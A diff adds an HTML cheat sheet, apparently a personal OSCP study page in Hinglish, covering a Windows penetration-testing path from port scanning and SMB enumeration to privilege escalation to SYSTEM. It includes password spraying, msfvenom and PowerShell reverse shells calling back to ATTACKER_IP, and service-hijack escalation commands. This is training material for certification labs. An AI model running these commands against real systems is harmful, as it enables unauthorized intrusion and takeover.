@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Windows Full Access Playbook — Scan to SYSTEM</title>
+<style>
+  :root{
+    --bg:#0b0f14; --panel:#111820; --panel2:#0e151c; --text:#d7e2ea; --muted:#7d93a3; --grid:#1c2731;
+    --c1:#3fd0ff; --c2:#ffb454; --c3:#5eff8f; --c4:#ff5c8a; --c5:#8a6bff;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:radial-gradient(circle at 15% 0%,#10202b 0%,transparent 45%),var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,-apple-system,sans-serif;line-height:1.55}
+  header{padding:48px 6vw 36px;border-bottom:1px solid var(--grid);background:linear-gradient(180deg,#0d1720,#0b0f14 90%)}
+  .eyebrow{font-family:Consolas,monospace;color:var(--c1);letter-spacing:.14em;font-size:12px;text-transform:uppercase}
+  h1{margin:10px 0 6px;font-size:clamp(26px,4vw,42px);font-weight:800;color:#f2f7fa}
+  .subtitle{color:var(--muted);font-size:15px;max-width:800px}
+  .badge-row{margin-top:22px;display:flex;gap:10px;flex-wrap:wrap}
+  .badge{font-family:Consolas,monospace;font-size:11px;padding:6px 12px;border-radius:20px;border:1px solid currentColor;text-transform:uppercase;letter-spacing:.05em}
+  main{padding:40px 6vw 90px;max-width:1150px;margin:0 auto}
+  .flow{display:flex;gap:8px;flex-wrap:wrap;margin:0 0 50px}
+  .flow span{font-family:Consolas,monospace;font-size:12px;background:var(--panel);border:1px solid var(--grid);padding:8px 14px;border-radius:20px;color:#c3d1db}
+  .flow .arrow{color:var(--muted);padding:8px 0}
+  .section{margin-bottom:52px}
+  .section-head{display:flex;align-items:baseline;gap:14px;border-bottom:1px solid var(--grid);padding-bottom:10px;margin-bottom:18px}
+  .section-num{font-family:Consolas,monospace;font-size:13px;color:var(--muted)}
+  .section h2{margin:0;font-size:21px;color:#f2f7fa}
+  .tag{margin-left:auto;font-family:Consolas,monospace;font-size:10.5px;padding:3px 10px;border-radius:14px;text-transform:uppercase;letter-spacing:.05em}
+  p{color:#c3d1db}
+  table{width:100%;border-collapse:collapse;background:var(--panel);border-radius:10px;overflow:hidden;font-size:13.5px;margin:14px 0 22px}
+  th{text-align:left;background:var(--panel2);color:var(--muted);font-family:Consolas,monospace;font-size:11px;text-transform:uppercase;letter-spacing:.06em;padding:11px 13px;border-bottom:1px solid var(--grid)}
+  td{padding:11px 13px;border-bottom:1px solid var(--grid);color:#c3d1db;vertical-align:top}
+  tr:last-child td{border-bottom:none}
+  pre{background:#080b0f;border:1px solid var(--grid);border-radius:8px;padding:14px 17px;overflow-x:auto;font-family:Consolas,monospace;font-size:13px;color:var(--c3);margin:8px 0 20px}
+  code.inline{background:#080b0f;color:var(--c3);padding:2px 6px;border-radius:4px;font-size:12.5px;border:1px solid var(--grid)}
+  .cm{color:#7d93a3}
+  .steps{counter-reset:step;list-style:none;padding:0;margin:16px 0}
+  .steps li{counter-increment:step;position:relative;padding:14px 16px 14px 52px;background:var(--panel);border-radius:8px;margin-bottom:10px;border:1px solid var(--grid)}
+  .steps li::before{content:counter(step);position:absolute;left:14px;top:14px;width:26px;height:26px;border-radius:50%;background:rgba(63,208,255,.15);color:var(--c1);font-family:Consolas,monospace;font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;border:1px solid rgba(63,208,255,.5)}
+  .note{background:var(--panel);border-left:3px solid var(--c1);padding:12px 16px;border-radius:0 8px 8px 0;margin:14px 0;font-size:13.5px;color:#b9c8d3}
+  .note.opsec{border-left-color:var(--c5)}
+  footer{padding:28px 6vw 50px;color:var(--muted);font-size:12px;border-top:1px solid var(--grid);font-family:Consolas,monospace}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="eyebrow">OSCP Skill Map · Windows Track</div>
+  <h1>Windows Full Access Playbook</h1>
+  <p class="subtitle">Ek Windows target machine milne se lekar full SYSTEM access tak — poora step-by-step process, har stage ke tools aur commands ke saath.</p>
+  <div class="badge-row">
+    <span class="badge" style="color:var(--c1)">Enumeration</span>
+    <span class="badge" style="color:var(--c2)">Initial Access</span>
+    <span class="badge" style="color:var(--c3)">Foothold</span>
+    <span class="badge" style="color:var(--c4)">Privesc</span>
+    <span class="badge" style="color:var(--c5)">Full Access</span>
+  </div>
+</header>
+
+<main>
+
+  <div class="flow">
+    <span>1. Port Scan</span><span class="arrow">→</span>
+    <span>2. Service Enum</span><span class="arrow">→</span>
+    <span>3. Vuln Identify</span><span class="arrow">→</span>
+    <span>4. Exploit</span><span class="arrow">→</span>
+    <span>5. Foothold</span><span class="arrow">→</span>
+    <span>6. Local Enum</span><span class="arrow">→</span>
+    <span>7. Privesc</span><span class="arrow">→</span>
+    <span>8. SYSTEM Access</span><span class="arrow">→</span>
+    <span>9. Proof</span>
+  </div>
+
+  <!-- 1 -->
+  <div class="section">
+    <div class="section-head"><span class="section-num">01</span><h2>Port Scanning &amp; Enumeration</h2><span class="tag" style="color:var(--c1)">Start Here</span></div>
+    <ol class="steps">
+      <li><strong>Full port scan sabse pehle:</strong>
+        <pre>nmap -sS -p- --min-rate=1000 -oG initial.txt TARGET_IP</pre>
+      </li>
+      <li><strong>Discovered ports pe deep scan:</strong>
+        <pre>nmap -sV -sC -p PORT1,PORT2,PORT3 -oN detailed.txt TARGET_IP</pre>
+      </li>
+      <li><strong>Windows-specific common ports check karo:</strong> 135 (RPC), 139/445 (SMB), 389 (LDAP — agar AD hai), 3389 (RDP), 5985 (WinRM)</li>
+      <li><strong>Full aggressive scan (optional, slow):</strong>
+        <pre>nmap -A -p- TARGET_IP</pre>
+      </li>
+    </ol>
+  </div>
+
+  <!-- 2 -->
+  <div class="section">
+    <div class="section-head"><span class="section-num">02</span><h2>Service-Specific Enumeration</h2><span class="tag" style="color:var(--c1)">Deep Dive</span></div>
+    <table>
+      <tr><th>Port/Service</th><th>Enumeration Command</th></tr>
+      <tr><td>SMB (139/445)</td><td><code class="inline">smbclient -L //TARGET_IP/ -N</code><br><code class="inline">crackmapexec smb TARGET_IP --shares -u '' -p ''</code></td></tr>
+      <tr><td>RPC (135)</td><td><code class="inline">rpcclient -U "" TARGET_IP</code></td></tr>
+      <tr><td>LDAP (389)</td><td><code class="inline">ldapsearch -x -h TARGET_IP -b "dc=domain,dc=local"</code></td></tr>
+      <tr><td>Web (80/443 — IIS common)</td><td><code class="inline">gobuster dir -u http://TARGET_IP -w wordlist.txt</code><br><code class="inline">whatweb TARGET_IP</code></td></tr>
+      <tr><td>WinRM (5985)</td><td><code class="inline">crackmapexec winrm TARGET_IP -u user -p pass</code></td></tr>
+      <tr><td>RDP (3389)</td><td><code class="inline">rdesktop TARGET_IP</code> (jab creds mil jaayein)</td></tr>
+    </table>
+  </div>
+
+  <!-- 3 -->
+  <div class="section">
+    <div class="section-head"><span class="section-num">03</span><h2>Initial Access — Common Vectors</h2><span class="tag" style="color:var(--c2)">Get In</span></div>
+
+    <table>
+      <tr><th>Vector</th><th>Kab use hota hai</th><th>Kaise</th></tr>
+      <tr><td>Public exploit (service version)</td><td>Version detect hui aur known CVE hai</td><td><code class="inline">searchsploit service_name version</code></td></tr>
+      <tr><td>Web app vulnerability</td><td>IIS/web server pe koi bug (SQLi, file upload)</td><td>Manual test + Burp Suite</td></tr>
+      <tr><td>SMB null session / weak creds</td><td>Shares accessible without auth</td><td><code class="inline">crackmapexec smb TARGET_IP -u '' -p ''</code></td></tr>
+      <tr><td>Password spraying</td><td>Valid usernames mil chuke hain (OSINT se)</td><td><code class="inline">crackmapexec smb TARGET_IP -u users.txt -p 'Password1'</code></td></tr>
+      <tr><td>WinRM with valid creds</td><td>Kisi tarike se creds/hash mil gaye</td><td><code class="inline">evil-winrm -i TARGET_IP -u user -p pass</code></td></tr>
+    </table>
+
+    <div class="note">Jo bhi vector kaam kare, usi se ek initial low-privilege shell milta hai — yahi tera <strong>foothold</strong> hai.</div>
+  </div>
+
+  <!-- 4 -->
+  <div class="section">
+    <div class="section-head"><span class="section-num">04</span><h2>Establishing Foothold (Reverse Shell)</h2><span class="tag" style="color:var(--c3)">Access Confirm</span></div>
+    <ol class="steps">
+      <li><strong>Listener start karo apne machine pe:</strong>
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li><strong>Payload generate karo (agar exploit ke through deliver karna hai):</strong>
+        <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe</pre>
+      </li>
+      <li><strong>Ya PowerShell one-liner directly use karo (agar command exec mil chuka hai):</strong>
+        <pre>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);..."</pre>
+      </li>
+      <li><strong>Shell stabilize karo</strong> — proper terminal jaisa banane ke liye.</li>
+    </ol>
+  </div>
+
+  <!-- 5 -->
+  <div class="section">
+    <div class="section-head"><span class="section-num">05</span><h2>Local Enumeration (Post-Foothold)</h2><span class="tag" style="color:var(--c4)">Before Privesc</span></div>
+    <p>Ab tu andar hai (low-priv user) — yahan se privesc path dhundhna hai. Enumeration script chalao pehle:</p>
+    <pre><span class="cm"># WinPEAS ya Seatbelt upload karke run karo</span>
+.\winPEASx64.exe</pre>
+    <table>
+      <tr><th>Manually bhi check karo</th><th>Command</th></tr>
+      <tr><td>Current privileges</td><td><code class="inline">whoami /priv</code></td></tr>
+      <tr><td>Groups</td><td><code class="inline">whoami /groups</code></td></tr>
+      <tr><td>Installed software</td><td><code class="inline">wmic product get name,version</code></td></tr>
+      <tr><td>Running services</td><td><code class="inline">tasklist /svc</code></td></tr>
+      <tr><td>Scheduled tasks</td><td><code class="inline">schtasks /query /fo LIST /v</code></td></tr>
+      <tr><td>Unquoted service paths</td><td><code class="inline">wmic service get name,pathname,startmode</code></td></tr>
+    </table>
+  </div>
+
+  <!-- 6 -->
+  <div class="section">
+    <div class="section-head"><span class="section-num">06</span><h2>Privilege Escalation → SYSTEM</h2><span class="tag" style="color:var(--c4)">Full Access</span></div>
+    <table>
+      <tr><th>Vector Found</th><th>Exploit Method</th></tr>
+      <tr><td>SeImpersonatePrivilege enabled</td><td><code class="inline">PrintSpoofer.exe -i -c cmd</code> (Potato-style attack)</td></tr>
+      <tr><td>Unquoted service path</td><td>Malicious exe us folder mein place karo jo path match kare</td></tr>
+      <tr><td>Weak service permissions</td><td><code class="inline">sc config SERVICE binpath= "payload.exe"</code>, phir restart karo</td></tr>
+      <tr><td>AlwaysInstallElevated</td><td>MSI payload banake run karo — direct SYSTEM</td></tr>
+      <tr><td>Stored credentials (registry/files)</td><td>Admin account creds mil jaaye to directly login</td></tr>
+      <tr><td>Kernel exploit (last resort)</td><td>Matching CVE exploit compile karke run karo</td></tr>
+    </table>
+    <div class="note">Har machine mein alag path hoga — WinPEAS output carefully padho, wahi bata dega kaunsa vector applicable hai is specific machine pe.</div>
+  </div>
+
+  <!-- 7 -->
+  <div class="section">
+    <div class="section-head"><span class="section-num">07</span><h2>Full Access Confirm &amp; Proof</h2><span class="tag" style="color:var(--c5)">Final Step</span></div>
+    <ol class="steps">
+      <li><strong>SYSTEM confirm karo:</strong>
+        <pre>whoami
+<span class="cm"># Output: nt authority\system</span></pre>
+      </li>
+      <li><strong>Proof files locate karke padho:</strong>
+        <pre>type C:\Users\Administrator\Desktop\proof.txt
+type C:\Users\<username>\Desktop\local.txt</pre>
+      </li>
+      <li><strong>Screenshot lo</strong> — dono files ka content + <code class="inline">whoami</code> output, report ke liye zaroori.</li>
+      <li><strong>Documentation karo</strong> — har step jo kiya (enumeration se access tak) note karte jaana, report mein use hoga.</li>
+    </ol>
+  </div>
+
+  <div class="note opsec">
+    <strong>Yaad rakh:</strong> Ye poora playbook sirf authorized lab machines (TryHackMe/HackTheBox/PG Practice/exam) ke liye hai — kabhi bhi bina permission ke kisi real system pe try mat karna.
+  </div>
+
+</main>
+
+<footer>
+  Windows Full Access Playbook · Scan to SYSTEM · Karan's Reference Vault
+</footer>
+
+</body>
+</html>
